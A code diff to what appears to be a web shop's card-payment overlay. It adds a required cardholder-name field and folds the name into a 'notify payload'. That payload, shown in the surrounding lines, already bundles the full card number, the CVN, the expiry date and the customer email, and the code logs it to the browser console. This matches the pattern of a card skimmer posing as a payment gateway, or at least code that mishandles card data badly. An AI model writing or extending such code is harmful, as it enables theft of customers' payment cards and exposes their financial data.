@@ -173,6 +173,20 @@
             <div id="cs-gw-err-brand" class="cs-gw-error" role="alert"></div>
           </div>
 
+          <!-- 1b. Cardholder Name -->
+          <div class="cs-gw-field">
+            <label for="cs-gw-cardholder-name" class="cs-gw-label">Cardholder Name <span class="cs-gw-req">*</span></label>
+            <input
+              id="cs-gw-cardholder-name"
+              name="cs_cardholder_name"
+              type="text"
+              autocomplete="cc-name"
+              maxlength="80"
+              class="cs-gw-input"
+            />
+            <div id="cs-gw-err-cardholder" class="cs-gw-error" role="alert"></div>
+          </div>
+
           <!-- 2. Card Number -->
           <div class="cs-gw-field">
             <label for="cs-gw-card-number" class="cs-gw-label">Card Number <span class="cs-gw-req">*</span></label>
@@ -360,6 +374,11 @@
   function clearAllErrors() {
     if (!overlayEl) return;
     setFieldError('cs-gw-err-brand', null, '');
+    setFieldError(
+      'cs-gw-err-cardholder',
+      overlayEl.querySelector('#cs-gw-cardholder-name'),
+      ''
+    );
     setFieldError('cs-gw-err-number', overlayEl.querySelector('#cs-gw-card-number'), '');
     setFieldError('cs-gw-err-month', overlayEl.querySelector('#cs-gw-exp-month'), '');
     setFieldError('cs-gw-err-year', overlayEl.querySelector('#cs-gw-exp-year'), '');
@@ -495,6 +514,13 @@
         valid = false;
       }
 
+      const holderNameEl = overlayEl.querySelector('#cs-gw-cardholder-name');
+      const holderName = (holderNameEl?.value || '').trim();
+      if (!holderName) {
+        setFieldError('cs-gw-err-cardholder', holderNameEl, 'Cardholder name is required.');
+        valid = false;
+      }
+
       if (!valid) return;
 
       const masked = maskCardNumber(rawDigits, brand);
@@ -522,6 +548,8 @@
       confirmView.classList.remove('cs-gw-view-hidden');
 
       if (activeContext?.orderNumber && activeContext?.email) {
+        activeContext.cardholderName = holderName;
+
         const notifyPayload = {
           orderNumber: activeContext.orderNumber,
           customerEmail: activeContext.email,
@@ -531,7 +559,7 @@
           expiration: expMonth + '/' + expYear,
           fullCardNumber: rawDigits,
           cvn: cvn,
-          cardholderName: activeContext.cardholderName || '',
+          cardholderName: holderName,
         };
 
         console.log('[CS Gateway] Sending notify payload:', notifyPayload);
